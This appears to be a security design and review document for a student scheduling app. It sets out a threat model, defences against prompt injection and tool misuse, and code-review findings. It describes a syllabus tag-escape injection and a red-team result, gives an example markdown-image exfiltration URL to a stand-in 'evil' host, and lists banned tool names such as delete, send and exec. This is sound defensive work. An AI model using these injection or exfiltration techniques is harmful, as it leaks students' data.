# Semester OS: Security

Owner: Security agent. Last updated 2026-10-17. Luca asked for security in layers: no prompt injection, nothing a model or agent could do on the site that causes damage, plus good general practice. Wiring requests go through Planner to the file owners. Nothing here has been deployed.

How to verify the new code: `python -I -m unittest discover backend/tests` (offline, no AWS), `python -I scripts/redteam.py` (offline adversarial run), `python -I scripts/redteam.py --live` (at most 20 small Bedrock calls).

## 1. Threat model

**Assets**
1. Student data: classes, deadlines, chat history, email, campus (DynamoDB, S3 syllabi).
2. Calendar tokens: `calToken` in the profile and `CAL#{token}` map. Anyone with the token reads a student's whole schedule.
3. Blackboard feed URLs: a secret link that exposes the student's Blackboard calendar. Stored in the profile.
4. Admin powers: creating campuses, approving requests, editing campus data (affects every student of a school).
5. Bedrock budget and the AWS account (cost, throttling, other quotas such as Cognito email 50/day, Lambda concurrency 10).
6. Reputation: the demo must not show injected text, broken pages or someone else's data.

**Attackers and what each can reach**

| Attacker | Entry point | Goal |
|---|---|---|
| Malicious syllabus or PDF author | text or PDF the student uploads | steer the model: change or delete data, leak the prompt, smuggle links or images, poison dates |
| Malicious marketplace listing author | listing title, description (shown to other students, later fed to the Books agent) | stored XSS, image exfiltration, prompt injection across users |
| Malicious Blackboard calendar event | title and description in the student's feed (an instructor or a hacked course) | injection into the sync agent, iCal injection into the outbound feed |
| Another student | any API id (courseId, assignmentId), calendar token guessing | read or change someone else's data |
| Anonymous internet user | `/public/*`, `/cal/*`, signup | spam the admin queue, flood Cognito emails, burn Bedrock, enumerate campuses or tokens, brute-force |
| Compromised or confused model | its own output and tool calls | anything above, with the app's own permissions |
| Malicious school name or registry data (auto-campus) | `POST /public/campus-request`, admin-edited names, dataset | stored XSS or injection through a campus name rendered everywhere |

**Design rule.** The model is treated as a confused, possibly hostile intern: everything it reads is data, everything it asks for is validated in code, and everything it says is untrusted until sanitised. Even if the model is fully compromised, the worst it can do is what the tool gate allows: add or edit this one user's assignments and study blocks, each visible as an action with undo.

## 2. Layered controls

Status: done = code written and tested but see "needs wiring" for use; needs wiring = depends on a change in a file Security does not own.

| # | Layer | Control | Status | Owner |
|---|---|---|---|---|
| 1 | Prompt injection | `guard.sanitize_untrusted` strips control, zero-width, bidi and tag characters, NFKC-normalises (fullwidth look-alikes), caps length, neutralises delimiters, structure tags, chat-template tokens, role prefixes and nonce-shaped strings | done (tested) | Security |
| 1 | | `guard.wrap_untrusted(label, text, nonce)` wraps every untrusted block with a per-request random nonce; `guard.data_rules(nonce)` is the system-prompt rule block | done; **needs wiring** in `extract.py` (currently fixed `<syllabus>` tags, no nonce), tutor, master, router, feed sync, books | Builder |
| 1 | | Model output is never executed: tool args pass the gate, extraction output passes `normalize()`, text passes `sanitize_model_output` | partly done (`normalize` exists); gate and sanitiser need wiring | Builder |
| 1 | | Optional Bedrock Guardrails PROMPT_ATTACK filter | evaluated, not wired (section 8) | Security |
| 2 | Tool containment | `guard.validate_tool_call(agent, name, args, ctx)`: per-agent allow-list, strict arg schema (types, enums, bounded strings, real dates within 400 days, ids `[a-z0-9]{8}`), unknown args rejected, ownership checked against the user's own items, class agent pinned to its own course | done (tested); needs wiring when tools ship (Phase 4) | Builder |
| 2 | | No destructive tools: no delete, export, send, fetch or shell names exist, and a test fails if one is added. Delete-course stays a user-only API route | done | Security / Builder |
| 2 | | `guard.ToolBudget`: max 5 model round trips, 12 calls, 6 writes per request | done; needs wiring | Builder |
| 2 | | `guard.make_action(kind, summary, undo)`: every side effect becomes a visible action chip plus activity entry with an undo recipe | done; needs wiring | Builder / Mobile / Designer |
| 2 | | `guard.UserScopedDB(sub, db, denied_prefixes=MODEL_DENIED_PREFIXES)`: pk always `USER#{sub}`, sort keys regex-checked, cannot set gsi or key attributes, model view cannot read `PROFILE` (calToken, feed URL), `CAL`, `FEED`, `LIMIT` | done (tested with a fake table); needs wiring | Builder |
| 3 | Output handling | `guard.sanitize_model_output`: strips markdown images (inline, reference, bare), raw HTML, scripts, comments; keeps only http, https, mailto and relative links; defangs `javascript:` and `data:`; length cap | done (tested); needs wiring | Builder |
| 3 | | UI renders model text as plain text, or markdown with HTML disabled and images off; links `rel="noopener noreferrer" target="_blank"` | not started | Builder / Designer / Mobile (rules in W3, W4) |
| 3 | | CSP `img-src 'self' data:` blocks image exfiltration even if the sanitiser misses one | needs wiring (W9) | Builder |
| 3 | | `guard.ical_text` escapes every string placed in the outbound `.ics` (prevents CRLF property injection) | done; needs wiring when the feed is built (Phase 3) | Builder |
| 4 | SSRF / fetch | `safe_fetch.fetch` and `fetch_ical`: https and port 443 only, no userinfo, no IP literals, rejects decimal/hex/octal host tricks, resolves and requires every address to be public (IPv4 and IPv6, mapped, 6to4, Teredo, NAT64, metadata, CGNAT), connects to the vetted IP (defeats DNS rebinding), manual redirects max 3 each re-vetted, timeout and deadline, size cap, `Accept-Encoding: identity`, never logs or returns the URL | done (tested with fakes); needs wiring in `sync_blackboard.py` and `PUT /me/feed` | Builder |
| 5 | Rate limits | `limits.check_user(table, sub, bucket)` per-minute and per-day counters (conditional update, ttl, rejected calls do not grow counters); `limits.check_ip` for anonymous endpoints (hashed IP); `error_response` gives 429 with Retry-After | done (tested); needs wiring | Builder |
| 5 | | Kill switch `limits.ai_enabled` (env `AI_ENABLED=0`, or SSM parameter named in `AI_ENABLED_PARAM`, cached 30 s) and `require_ai_enabled` | done; needs wiring | Builder / Luca |
| 5 | | Size caps: `check_body_size`, `cap_text`, `cap_messages` (also rejects client-supplied `system` role), `max_output_tokens(purpose)` | done; needs wiring | Builder |
| 5 | | API Gateway stage throttling (burst and rate) as the outer fence | needs wiring (W8) | Builder |
| 6 | Secrets and logs | `redact.redact` / `redact.safe` / `redact.install()` remove JWTs, bearer tokens, AWS keys, secret-looking assignments, emails, calendar token paths, any URL with a query or any feed-looking URL, long random strings | done (tested); needs wiring | Builder |
| 6 | | Encrypt the stored feed URL with KMS | needs wiring (W7) | Builder |
| 6 | | Remove committed admin key, scrub account id | needs wiring (W11, checklist 6) | Builder / Planner |
| 7 | Infra | Least-privilege IAM, separate roles, CORS to two origins, CloudFront headers policy and CSP, HSTS, S3 constraints, PITR, alarms, budgets | needs wiring (section 5) | Builder / Admin |
| 7 | Admin | Separate staff pool with TOTP MFA, group check, issuer check, audit log, atomic campus create | done by Admin; needs wiring in `stack.py` and `api.py`; fail-closed tweak (F8) | Admin / Builder |
| 8 | Supply chain | Lockfiles committed, audits run | partly done (section 6) | Builder |
| 9 | Guardrails | Bedrock Guardrails PROMPT_ATTACK | optional, not wired | Security |

## 3. Wiring requests (ranked by priority, each with owner)

### W1 (High, Builder): replace ad hoc syllabus wrapping with the nonce wrapper and add the rules block
File `backend/lib/extract.py`, `_system_prompt` and `_user_message`.
Why: today the delimiter is a fixed `<syllabus>` tag, so a syllabus containing `</syllabus>` can close it and write instructions outside the data block (see F4). Extraction output is normalised so the blast radius is small, but the same pattern will be copied into the tutor, router and sync agent.
```python
from . import guard
def _system_prompt(today, nonce):
    return ("You extract structured facts from a college course syllabus. ...existing rules...\n" + guard.data_rules(nonce))
def _user_message(text, as_json_text, nonce, pdf_bytes=None):
    block = guard.wrap_untrusted("syllabus", text, nonce)
    ...{"text": f"{block}\n\n{ask}"}
# in _extract(): nonce = guard.new_nonce(); pass it to both functions
```
Rule for every future prompt: generate ONE nonce per request, wrap every untrusted block (syllabus, PDF text, material summaries, feed events, listings, previous chat turns) with it, and put `guard.data_rules(nonce)` in the system prompt. Do not put the nonce anywhere the user can read it back.

### W2 (High, Builder): all model tools go through one gate (Phase 4)
In the tool loop (`lib/tools.py`, `lib/agents.py` or the chat endpoint):
```python
from lib import guard, limits
db = guard.UserScopedDB(sub, db_module, denied_prefixes=guard.MODEL_DENIED_PREFIXES)
ctx = {"db": db, "today": today_in_campus_tz, "course_id": course_id_for_class_agents}
budget = guard.ToolBudget()
while budget.next_round():
    resp = bedrock.converse(...tools=only_tools_for(agent)...)
    for use in tool_uses(resp):
        try:
            budget.spend(use["name"])
            args = guard.validate_tool_call("class", use["name"], use["input"], ctx)   # use ONLY args from here
            result, action = run_tool(use["name"], args, db)                           # tool code uses `db`, never raw db.py
            actions.append(guard.make_action(...))
        except guard.ToolRejected as e:
            result = {"error": e.message}          # fed back to the model as a toolResult, never executed
```
Only offer the model the tool specs listed in `guard.AGENT_TOOLS[agent]`. Tool functions must read and write only through `UserScopedDB`. Never add a tool whose name contains delete, remove, send, export, fetch or exec; if one is truly needed, it needs a human confirmation step in the UI and a Security review.

### W3 (High, Builder and Designer, web): render model text safely
- Run `guard.sanitize_model_output` server-side on every model text field before returning it (chat reply, briefing, quiz explanations, summary, course notes, activity text).
- The UI must render model and user text as React text nodes. No `dangerouslySetInnerHTML`, no `innerHTML` (none today). If markdown is wanted, use a renderer with raw HTML disabled and images disabled (for example `react-markdown` with `skipHtml` and `disallowedElements={['img']}`), and `components={{a: (p) => <a {...p} target="_blank" rel="noopener noreferrer nofollow"/>}}`.
- Every other user-supplied string (listings, campus names, request messages, assignment titles) is rendered the same way, as text.

### W4 (High, Mobile): never render model HTML
Render model text with `<Text>`. Do not use a WebView for model or user content, and do not use `Linking.openURL` on a URL taken from model text without checking that it starts with `https://` and showing the user the destination first. Open links with `Linking.openURL` only after `guard`-style scheme checks (https or mailto).

### W5 (High, Builder): rate limits, size caps and the kill switch on every Bedrock-backed route
In `api.py` (and the worker for PDFs), at the top of each model-backed route:
```python
from lib import limits
limits.require_ai_enabled()
limits.check_body_size(event)                       # before json.loads
limits.check_user(db.table(), sub, "chat")          # buckets: chat, syllabus, briefing, plan, quiz, feed_save
# for converse calls: max_tokens=limits.max_output_tokens("chat")
# for chat: messages = limits.cap_messages(body["messages"])
# in handler(): except limits.LimitError as e: return limits.error_response(e)
```
Replace the ad hoc `CAP#courses#day` counter in `courses_api.py` with `limits.check_user(..., "syllabus")` (it also adds a per-minute limit). The Lambda role needs `dynamodb:UpdateItem` only for this. Luca flips the switch with `AI_ENABLED=0` on the function, or an SSM parameter (`aws ssm put-parameter --name /semesteros/ai_enabled --value off --overwrite`, with `AI_ENABLED_PARAM=/semesteros/ai_enabled` on the Lambda and `ssm:GetParameter` on that one parameter).

### W6 (High, Builder): public endpoint abuse controls
`POST /public/campus-request`: call `limits.check_ip(db.table(), limits.client_ip(event), "campus_request")` first (5 per hour, 20 per day per IP); `limits.check_body_size(event, 8000)`; require `schoolName`, `submitterName`, `domain` to be `str` (today a JSON number raises AttributeError and returns 500); cap and validate `submitterRole` (enum) and `submitterEmail` (shape check); reject free-mail domains (Admin has the list in `admin_api.FREE_MAIL_DOMAINS`, share it from `lib/`). `GET /public/resolve` and `/public/tenants`: `check_ip(..., "default")`. `GET /cal/{token}.ics`: validate the token shape (`[a-z0-9]{24}`) before any DynamoDB read and rate limit by IP.

### W7 (Medium, Builder): feed URL protection
- `PUT /me/feed`: validate with `safe_fetch.check_url(url)` (reject at save time), do one test fetch with `safe_fetch.fetch_ical`, then store `kms.encrypt(url)` ciphertext (base64) in the profile instead of plaintext. Return only a masked form (`https://host/...abcd`), never the full URL.
- CDK:
```python
from aws_cdk import aws_kms as kms
feed_key = kms.Key(self, "FeedKey", enable_key_rotation=True, removal_policy=RemovalPolicy.RETAIN,
                   description="Encrypts stored Blackboard feed URLs")
sync_fn_env["FEED_KEY_ID"] = feed_key.key_id
feed_key.grant_encrypt(api_fn); feed_key.grant_decrypt(sync_fn)    # only the sync Lambda can decrypt
```
- Split the sync Lambda from the API Lambda (W10) so the function that fetches external URLs has no write access to unrelated data.

### W8 (High, Builder): API Gateway throttling and CORS
```python
http_api = apigw.HttpApi(self, "HttpApi",
    cors_preflight=apigw.CorsPreflightOptions(
        allow_origins=[student_cf_url, admin_cf_url],     # the two CloudFront origins, not "*"; add http://localhost:5173 only for local dev
        allow_methods=[apigw.CorsHttpMethod.GET, POST, PUT, PATCH, DELETE, OPTIONS],
        allow_headers=["authorization", "content-type"], max_age=Duration.hours(1)))
default_stage = http_api.default_stage.node.default_child          # CfnStage
default_stage.default_route_settings = apigw.CfnStage.RouteSettingsProperty(throttling_burst_limit=40, throttling_rate_limit=20)
```
Optionally tighter route settings for `POST /public/campus-request` and `GET /cal/{proxy+}` (burst 5, rate 2). If CORS creates a circular reference with the CloudFront domains, set the origins after both exist (ADMIN.md has the pattern). Remove `x-admin-key` from `allow_headers` once the admin site is wired. Note CORS is not a security boundary for non-browser clients; the JWT authorizer is.

### W9 (High, Builder with Designer): CloudFront response headers and CSP for the student site
Attach a `ResponseHeadersPolicy` to the website distribution (the admin site already has one in `infra/admin_site.py`; copy it). Facts from Designer: the student app has no inline scripts, `theme.ts` uses constructed stylesheets or CSSOM with a `<style>` fallback only for old browsers, React `style` props are CSSOM, so a strict `style-src` should work (test it; if the fallback `<style>` is hit, add a nonce is not possible on static hosting, so drop the fallback or accept `'unsafe-inline'` for style only).
```python
csp = "; ".join([
  "default-src 'self'", "script-src 'self'", "style-src 'self'", "img-src 'self' data:", "font-src 'self'",
  f"connect-src 'self' {api_url} https://cognito-idp.{region}.amazonaws.com https://cognito-identity.{region}.amazonaws.com",
  "object-src 'none'", "base-uri 'none'", "form-action 'self'", "frame-ancestors 'none'", "upgrade-insecure-requests"])
```
Also: HSTS (`max-age` 2 years, includeSubDomains), `X-Content-Type-Options: nosniff`, `X-Frame-Options: DENY`, `Referrer-Policy: strict-origin-when-cross-origin` (student site) and `Permissions-Policy: camera=(), microphone=(), geolocation=()`. Set `minimum_protocol_version=TLS_V1_2_2021` on the distribution. The CloudFront 403/404 -> `/index.html` rewrite is fine for a SPA but means API-style 404s on the site return 200 HTML; harmless.
Deploy checklist from Designer: `web/src/styles/preview.html` and `design/robots/*` previews contain inline scripts and are dev-only. After `npm run build`, confirm `web/dist` contains no `preview.html`, then `aws s3 sync` must not upload them (`--exclude "*preview*"`). Vite only copies files under `public/` and imported modules, so this should hold; verify with `grep -rl "<script>" web/dist` (expected: no matches).

### W10 (High, Builder): least-privilege IAM and separate roles
Current state in `infra/stack.py`: Bedrock `resources=["*"]` on two functions; API and worker both `grant_read_write_data` on the whole table; API `upload_bucket.grant_read_write`.
- Scope Bedrock to the models actually used (the model ids in `model_env`, in us-east-1). For on-demand foundation models: `arn:aws:bedrock:us-east-1::foundation-model/<model-id>` for each id (`zai.glm-5`, `openai.gpt-oss-120b-1:0`, `mistral.mistral-large-3-675b-instruct`, `amazon.nova-lite-v1:0`). For the Claude fallback (an inference profile) add `arn:aws:bedrock:us-east-1:{account}:inference-profile/us.anthropic.claude-sonnet-4-6` plus the underlying foundation-model ARN in each region the profile routes to (`arn:aws:bedrock:*::foundation-model/anthropic.claude-sonnet-4-6`). Actions: `bedrock:InvokeModel` only; drop `InvokeModelWithResponseStream` (no streaming is used).
- Separate roles by job: (a) API Lambda: read/write table, invoke worker, presign upload; (b) syllabus worker: read S3 object under `syllabi/`, read/write table, Bedrock; (c) sync Lambda (the one that fetches external URLs): read only the profile and feed items it needs, write only assignments, feed cache and activity, KMS decrypt, no Bedrock unless required; (d) pre-signup: `grant_read_data` only (already). Use `iam.PolicyStatement` with `dynamodb:LeadingKeys` conditions where practical.
- S3: replace `grant_read_write` with `grant_put` (presign uses the signer's role) and a `grant_read` limited to prefixes `syllabi/*`; add `enforce_ssl=True` on both buckets (the admin bucket already has it). Upload bucket CORS: `allowed_origins` to the two CloudFront origins, methods `POST` only, `allowed_headers` limited.
- Remove `auto_delete_objects` and `RemovalPolicy.DESTROY` on anything holding real student data before real students are invited; for the hackathon it is acceptable, say so in the README.

### W12 (Medium, Builder): S3 upload constraints and magic bytes
Already good: presigned POST with `Content-Type: application/pdf`, `content-length-range 1..10MB`, key `syllabi/{sub}/{courseId}.pdf` derived from the token. Add: S3 event filter `suffix=.pdf` (done); the worker already checks `%PDF` via `pdf.extract_text`. Also add a bucket lifecycle rule (delete uploaded PDFs after 30 days) and `object_ownership=BUCKET_OWNER_ENFORCED`. The presigned POST expiry should be 5 minutes or less (`ExpiresIn=300`). Reject a second upload for the same course id (conditional on course status `AWAITING_UPLOAD`) so a leaked form cannot be replayed to overwrite.

### W13 (Medium, Builder): data protection and monitoring
- DynamoDB: `point_in_time_recovery=True` (and `deletion_protection=True` once real data exists). Add `removal_policy=RETAIN` for the table and the student user pool outside the hackathon.
- Alarms (CloudWatch, SNS email to Luca): Lambda `Errors >= 1` over 5 minutes for each function, `Throttles >= 1`, API Gateway `5xx` count over a threshold, Bedrock `InvocationThrottles`, and one alarm on `Invocations` of the model functions above an expected daily budget.
- Set Lambda `log_retention=logs.RetentionDays.ONE_MONTH` (default is forever) and enable HTTP API access logs without request headers or query strings.
- Cognito: enable `advanced_security_mode` only if budget allows (it is paid); otherwise raise password length to 10, add `enable_token_revocation=True` to the student client, shorten ID/access token validity to 30 minutes (the admin client already does), and set `prevent_user_existence_errors=True` (already true).
- Luca (not code): create an AWS Budgets alert, for example USD 20 and USD 50 monthly thresholds with email, and a Bedrock cost anomaly monitor. Enable account-level CloudTrail if not already on.

### W14 (Medium, Builder): wire `redact` into logs
At the top of each handler module (`api.py`, `process_syllabus.py`, `sync_blackboard.py`, `daily_run.py`, `pre_signup.py`):
```python
from lib import redact
redact.install()                     # wraps stdout, stderr and logging
...
except Exception as e:
    print(f"Unhandled error: {redact.safe(e)}")        # api.py line 57 today prints the raw exception
```
Never put emails, `calToken`, feed URLs, JWTs or syllabus text in a log line. Tracebacks pass through the wrapped stderr and are redacted.

### W15 (Medium, Builder): session and token handling on web
Amplify v6 stores Cognito tokens in `localStorage` by default, so any XSS would read the refresh token. The CSP in W9 is the main mitigation. Optional hardening: use `cognitoUserPoolsTokenProvider.setKeyValueStorage` with `sessionStorage` (tokens die with the tab) for the demo. `authFetch` is fine. After the admin move, the web app must not store anything admin-related.

### W16 (Medium, Builder and Admin): admin fail-closed
`admin_api._require_admin` skips the issuer check when `ADMIN_USER_POOL_ID` is empty. Make it fail closed: `pool = os.environ["ADMIN_USER_POOL_ID"]` or return 403 when unset. Also write the audit entry before the state change succeeds or in the same transaction, so an audit failure cannot hide an action. Require `https://` in tutoring URLs (`URL_RE` allows `http://`). Render campus and request fields in the admin UI as text (React default), never as HTML.

### W17 (Medium, Builder): move the app to the S3-backed upload bucket CORS and the web client to a locked-down config
`web/public/config.json` and `mobile/src/config.ts` contain only public ids (pool id, client id, API URL), which is fine to commit. Do not add secrets to either.

### W18 (Auto-campus, High, Builder): requirements from the abuse review (section 7)
Summary: pre-signup creates nothing; creation only from an authenticated `/me`; conditional put; suffix matching on a DNS label boundary; blocked/disabled flag checked at every lookup; per-IP limits on `/public/resolve`; escape or sanitise registry names. Details and code in section 7.

## 4. Findings (code review of the current tree)

Line numbers refer to files as read on 2026-10-17. Ranked High, Medium, Low.

### High
- **F2. Wildcard Bedrock permission and one shared full-table role** `infra/stack.py:144, 169` (`resources=["*"]`), `:134, :165` (full table read/write for both Lambdas). A compromised function or injected code path can call any model in the account (cost) and read or write every user's items. Fix: W10.
- **F3. CORS `*` on the API and the upload bucket** `infra/stack.py:176, 48-55`. Tokens travel in the Authorization header, not cookies, so CSRF risk is low, but `*` lets any website call the API from a victim's browser if it ever obtains a token (for example through XSS elsewhere), and it removes a layer. Fix: W8, W10.
- **F4. Syllabus injection boundary is a fixed tag** `backend/lib/extract.py` (`_user_message`, `<syllabus>...</syllabus>`; the system prompt mentions the tag). A syllabus containing `</syllabus>` followed by instructions escapes the data block. Impact today is limited (forced tool call whose output goes through `normalize()`, so a successful injection can corrupt that student's own extracted data and plant misleading text, not touch other users). Live redteam run (zai.glm-5): 1 of 14 runs obeyed an injected tool request. Fix: W1 plus W2.
- **F5. Free text from the model is stored unsanitised and will be rendered and exported.** `process_syllabus.py` stores `title`, `notes`, `summary`, `policies.*`, `meetings.location` from `normalize()`, which trims and caps length but keeps newlines, markdown images, links and HTML (`extract._s`). Rendered as markdown, `![x](https://evil/?d=...)` is an exfiltration channel; put in the `.ics` feed (Phase 3), a newline can inject iCal properties (for example an `ATTENDEE`, `ATTACH` or `VALARM` with a URL). Fix: W3 (sanitise on write or read), `guard.ical_text` on every ICS string (also drop control characters in `normalize._s`).
- **F6. No rate limits or per-minute caps anywhere except `courses_api` daily cap; unauthenticated endpoint writes to DynamoDB** `backend/api.py:70-108` (`POST /public/campus-request`): anyone can fill the admin queue and DynamoDB, and `body["schoolName"].strip()` on a non-string raises an AttributeError (500). No API Gateway throttling `infra/stack.py:172`. Fix: W6, W8.
- **F7. Calendar feed route and token handling** `backend/api.py:31` serves `/cal/*` without validation or limits. Tokens are `short_id(24)` from `secrets.choice` over 36 symbols, about 124 bits, which is strong. But when the real feed is built the token must be looked up in constant shape (validate `[a-z0-9]{24}` first), the response must carry `Cache-Control: private, no-store` and `Referrer-Policy: no-referrer`, and invalid tokens must return the same 404 with no timing difference. Add rotation (`POST /me/calendar-token/rotate`) and delete the old `CAL#` map in the same transaction.

### Medium
- **F8. Admin issuer check fails open** `backend/admin_api.py:100-102` (skipped when `ADMIN_USER_POOL_ID` is empty). Group check still applies, so a student token is rejected unless the student pool ever gets an `admins` group. Fix: W16.
- **F9. Tokens in localStorage on web** (Amplify default); admin key in sessionStorage `web/src/pages/AdminPage.tsx:31,46`. XSS would read both. Fix: W9 (CSP), W11 (delete AdminPage), W15.
- **F10. No CSP, HSTS or frame protection on the student site** `infra/stack.py:200-221`; `web/index.html` has no meta CSP. Fix: W9. The admin site already has a strict policy.
- **F11. Logging of raw exceptions** `backend/api.py:57-58` prints `e` and a traceback; Bedrock/boto errors can include request ids and sometimes payload fragments. `process_syllabus.py:54` prints part of an S3 key (contains the user sub). Not secrets, but personal identifiers. Fix: W14.
- **F12. Pre-signup and `/me` normalise domains to the last two labels** `backend/pre_signup.py:6-8`, `backend/lib/util.py:416-419`. `students.x.ac.uk` maps to `ac.uk`, so any `.ac.uk` or `.edu.au` address may match the wrong campus or an unrelated one; and `evil.ua.edu`-style subdomains are accepted by design. (Planner already tracks this in AUTO_CAMPUS.md.) Fix: W18.
- **F13. Tutoring URL accepts `http://`** `backend/admin_api.py:26`; rendered links should be https only. Fix: W16.
- **F14. Request body size is not capped before `json.loads`** `backend/api.py:72`, `courses_api.py` (API Gateway allows 10 MB, Lambda 6 MB). A 6 MB JSON costs memory and time on a public route. Fix: `limits.check_body_size` (W5, W6).
- **F15. Upload replay and bucket policy** `courses_api.py:90-94`: the presigned POST is bound to a fixed key per course, so a stolen form can overwrite the PDF until it expires, and the S3 notification would re-run the worker (the worker Lambda has retries off, but a second invocation will duplicate assignments). Fix: W12 (short expiry, status check in the worker so a course in `READY` ignores later uploads).
- **F16. Cognito email cap and signup abuse**: self sign-up with the default 50 emails per day. Anyone can burn it by starting signups for other people's addresses at a registry domain. Fix: section 7 (SES production access, per-IP throttle in front of signup, WAF rate rule on the Cognito endpoint if budget allows).
- **F17. Prompt-injection surfaces yet to be built**: tutor chat history, material summaries, feed events (sync agent), marketplace listings (Books agent). Each one must use W1 and W2 before it ships; the red-team script and unit tests are ready to extend.
- **F18. No `X-Content-Type-Options` or `Cache-Control: no-store` on JSON API responses** `backend/lib/util.py:395-408`. Add `"Cache-Control": "no-store"` and `"X-Content-Type-Options": "nosniff"` to `util.ok` and `util.error`.

### Low
- **F19.** Password policy is 8 characters, no uppercase or symbol `infra/stack.py:70-74`. Acceptable for students; raise to 10 for demo polish.
- **F20.** `util.error` messages are safe strings today; keep it so (never include `str(e)` in a response). `extract.ExtractionError` messages and `pdf.PdfError` messages are written for students and are fine.
- **F21.** `_derive_short_name` and campus names are user-influenced strings that end up in the UI and in prompts later. Treat them as untrusted text (section 7).
- **F22.** `backend/tests/` and `backend/vendor` are bundled into every Lambda asset (`Code.from_asset(backend_path)`). Harmless but increases package size; exclude `tests` and `__pycache__` with `exclude=["tests", "__pycache__"]`.
- **F24.** `DELETE /courses/{id}` is correct and user-scoped; make sure it never becomes a model tool.
- **F25.** `hmac.compare_digest` on admin key and JWT-derived `sub` for all user data are correct and match the spec.

## 4b. Admin site review (read-only, `admin/`, `infra/admin_site.py`, `backend/admin_api.py`, 2026-10-17)

Overall: good design. Separate staff pool with required TOTP, no self sign-up, SRP-only client without secret, 30-minute tokens, 8-hour refresh, dedicated JWT authorizer (staff issuer and audience) on `/admin/{proxy+}`, group and issuer re-check in code, tokens in sessionStorage with a 15-minute idle sign-out, strict CSP and HSTS on its own origin, own private bucket, atomic campus create, `npm audit --omit=dev` in `admin/`: 0 vulnerabilities. A student token cannot reach `/admin/*`: it fails the admin authorizer (different issuer and audience) and, even if it passed, `_require_admin` requires the `admins` group. Findings, ranked:

- **A1 (Medium): issuer check fails open** when `ADMIN_USER_POOL_ID` is unset (`admin_api.py:100-102`). Same as F8 / W16: fail closed.
- **A2 (Medium): admin handlers run in the same Lambda and role as the student API.** A bug or injection anywhere in the student path runs with the same table write access the admin code uses. Splitting `admin_api` into its own Lambda (own role, no Bedrock, no S3) is the cleaner boundary. Ask: W10 (separate roles).
- **A3 (Medium): CSP `connect-src https://*.execute-api.<region>.amazonaws.com`** lets the admin page talk to ANY API Gateway in the region, which is an exfiltration channel if an XSS ever lands. Pin it: pass `api_origin="https://<apiId>.execute-api.<region>.amazonaws.com"` to `AdminSite` (the id is known after the first deploy, so deploy once, then set it; no dependency cycle because it is a plain string from `cdk-outputs.json`). Also add `https://cognito-idp.<region>.amazonaws.com` (already there) only.
- **A4 (Medium): audit log gaps.** Create, approve and reject are logged, but not: denied attempts (403s, which are the interesting ones), reads of the request queue (it contains submitter names and emails), and campus edits or disables once Admin adds them. The audit write happens after the change; if the audit put fails the action is already done. Fix: log `admin.denied` (sub, route, reason, no token) from `_require_admin`; log reads of `campus-requests` and `audit`; put audit and change in one transaction (`transact_write_items`) for create and approve; keep 90 days but consider 365 and a `RemovalPolicy.RETAIN` table for audit. Also record source IP (`requestContext.http.sourceIp`) and user agent length-capped.
- **A5 (Medium): admin-provided fields are untrusted text for every consumer.** Campus name, shortName, tutoring name, description and URL, pickup spots are validated for length, colour is validated, but names allow any character. They are later rendered in the student web app, the Expo app, the tutor system prompt (campus name) and the calendar name. Rules: render as text only (no HTML, W3/W4), wrap in `guard.wrap_untrusted` when placed in prompts, `guard.ical_text` in feeds, and apply `guard.clean_text` on write to strip control, bidi and zero-width characters (a bidi override in a campus name can spoof other text). Tutoring `url` must be https only (`URL_RE` allows `http://`), have no credentials, and be shown as an external link with `rel="noopener noreferrer"`; the mobile app must open it only after an `https://` check.
- **A6 (Low): request fields are shown to admins as text; fine** (React escapes). `submitterEmail` and `message` come from an anonymous user; keep them out of prompts and out of logs.
- **A7 (Low): sessionStorage tokens** are readable by XSS in the admin origin; mitigated by the strict CSP (no inline script, `script-src 'self'`) and the short idle sign-out. Acceptable. Add `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-origin` to the admin headers policy.
- **A8 (Low): TOTP secret QR** is rendered locally as a `data:` image (`img-src data:` is allowed, no remote QR service), good. Make sure the secret is never logged or kept after setup.
- **A9 (Low): the staff pool `RemovalPolicy.RETAIN`** is right. `account_recovery=NONE` means a lost authenticator needs `scripts/create_admin_user.py`/an admin reset; document who can do that. Consider a second admin account (break-glass) kept offline.
- **A10 (Low): `timezones()`/`available_timezones()` import cost and missing tzdata** in the Lambda runtime (Admin noted it); not a security issue, but a startup failure would lock admins out of campus creation.

## 5. Dependency and supply chain (layer 8)

Run on 2026-10-17, read-only (`npm audit --omit=dev`, no installs, lockfiles untouched).

| Folder | Result |
|---|---|
| `web/` | 2 moderate: `react-router` / `react-router-dom` 6.0.0 to 7.17.0 (open redirect via backslash in `<Link>`/`useNavigate`, GHSA-wrjc-x8rr-h8h6; arbitrary constructor injection in SSR hydration, GHSA-337j-9hxr-rhxg). The SSR one does not apply (no SSR). Mitigation without a breaking upgrade: never pass user-controlled strings to `navigate()` or `<Link to>`; the auth redirect uses `location.state.from`, which is router-created, fine. A fix needs react-router-dom 7.18.4 (major version). |
| `mobile/` | 40 reported (16 moderate, 24 high), nearly all in Expo's build-time toolchain (`@expo/config-plugins`, `xcode`, `uuid`, `babel-plugin-istanbul` chains). These are dev/build tooling that do not ship in the app bundle. The suggested `npm audit fix --force` would downgrade Expo to an ancient version and must NOT be run. Pin to the SDK 54 versions Expo's `npx expo install --check` expects and re-audit after an SDK upgrade. |
| `admin/` | 0 vulnerabilities (`npm audit --omit=dev`). |
| `backend/` (Python) | `pip-audit` is not installed here, so not run. Dependencies: `pypdf==5.9.0` (pinned in `backend/requirements.txt`, vendored); `boto3` comes from the Lambda runtime. Run `pip install pip-audit && pip-audit -r backend/requirements.txt` when convenient and bump `pypdf` if it reports advisories (pypdf parses untrusted PDFs, so keep it current; the worker already caps size at 10 MB and 40 pages). |
| `infra/` | `infra/requirements.txt` should pin `aws-cdk-lib` and `constructs` to exact versions. |

Other supply-chain rules: lockfiles (`web/package-lock.json`, `mobile/package-lock.json`) are present and must stay committed; use `npm ci` in deploy scripts instead of `npm install` (deploy.py runs `npm install`, which can change the lockfile); the `^` ranges in `web/package.json` are fine with a lockfile. Do not add packages that run install scripts without review. Dependabot or `npm audit` in CI is a nice-to-have, not needed for the demo.

## 6. Pre-push secret scan checklist (the repo goes public)

1. Tools: run `gitleaks detect --no-git -s .` or `git secrets --scan` if installed (neither is on this machine; install gitleaks with `winget install gitleaks.gitleaks` if wanted). Otherwise run the greps below from the repo root.
2. Grep patterns (ignore `node_modules`, `cdk.out`, `.venv`, `vendor`, `dist`):
